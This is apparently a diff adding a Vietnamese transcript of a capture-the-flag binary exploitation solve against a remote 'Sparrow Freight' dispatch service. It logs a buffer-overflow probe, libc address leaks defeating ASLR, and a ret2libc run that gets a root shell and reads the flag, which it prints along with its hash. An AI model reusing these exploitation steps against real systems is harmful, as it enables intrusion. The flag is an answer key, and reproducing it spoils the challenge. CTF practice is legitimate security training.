@@ -1,0 +1,44 @@
+# Transcription của các lần gọi remote (không phải output trực tiếp từ lệnh, mà là bytes đã nhận được ghi lại trong các bước của phiên solve)
+
+## 1) Probe banner + 70 byte A
+$ python exploit.py-style probe (socket.create_connection pwn.h7tex.com 41136)
+BANNER repr: b'=== Sparrow Freight dispatch terminal ===\ndispatch> enter waybill number:\n'
+AFTER sendall(b"A"*70+b"\n"): b'waybill logged.\n'
+-> không crash với 70 byte (vừa đủ 64 buffer + 6), khớp pad = 0x48 tới return address.
+
+## 2) Attempt 1-3 (chain ĐÚNG, parser sai: quên trừ newline của puts)
+[*] banner: b'=== Sparrow Freight dispatch terminal ===\ndispatch> enter waybill number:\n'
+    [recv timeout after 55 bytes]
+[*] leaked bytes: c07ca8a5577f0a (7)   -> libc puts 0x7f57a5a87cc0 -> base 0x7f57a5a00000
+[*] leaked bytes: c07c88c4577f0a (7)   -> libc puts 0x7f57c4c87cc0 -> base 0x7f57c4c00000
+[*] leaked bytes: c07cc8fb3b7f0a (7)   -> libc puts 0x7f3bfbc87cc0 -> base 0x7f3bfbc00000
+[!] unexpected leak length
+[-] no flag captured
+-> ba base khac nhau = ASLR per connection, stage 1 sống, puts + vuln lan 2 chay du alignment.
+
+## 3) Attempt thanh cong (sau khi strip 0x0a cuoi)
+$ python exploit.py pwn.h7tex.com 41136 "id; ls -la; cat flag flag.txt /flag /flag.txt 2>/dev/null; ls /"
+[*] banner: b'=== Sparrow Freight dispatch terminal ===\ndispatch> enter waybill number:\n'
+[*] leaked bytes: c07c88edae7f0a (7)
+[+] puts -> 0x7faeed887cc0, libc base = 0x7faeed800000
+[*] post-exploitation output (1378 bytes):
+waybill logged.
+uid=0(root) gid=0(root) groups=0(root)
+total 47
+drwxr-xr-x  1 root root   80 Sep 26 05:28 .
+drwxr-xr-x  1 root root   80 Sep 26 05:28 ..
+lrwxrwxrwx  1 root root    7 Apr 22  2024 bin -> usr/bin
+drwxr-xr-x  1 root root 4096 Apr 22  2024 boot
+drwxr-xr-x  5 root root  360 Sep 26 05:28 dev
+-rwxrwxr-x  1 root root  225 Sep 25 20:39 entrypoint.sh
+drwxr-xr-x  1 root root 4096 Sep 25 20:40 etc
+-rw-r--r--  1 root root   44 Sep 26 05:28 flag
+drwxr-xr-x  1 root root 4096 Sep 11 02:10 home
+...
+H7CTF{0b79ca94-3b66-4509-9365-34d224d5cfe2}
+H7CTF{0b79ca94-3b66-4509-9365-34d224d5cfe2}
+[*] attempt 1: 1507 bytes received
+[+] FLAG: H7CTF{0b79ca94-3b66-4509-9365-34d224d5cfe2}
+
+flag.txt = 43 byte, khong them newline: H7CTF{0b79ca94-3b66-4509-9365-34d224d5cfe2}
+sha256(flag.txt) = e9f977290780328687b65aa70117a1ef34d51bc634eb9fe02fb61acd71f64faa
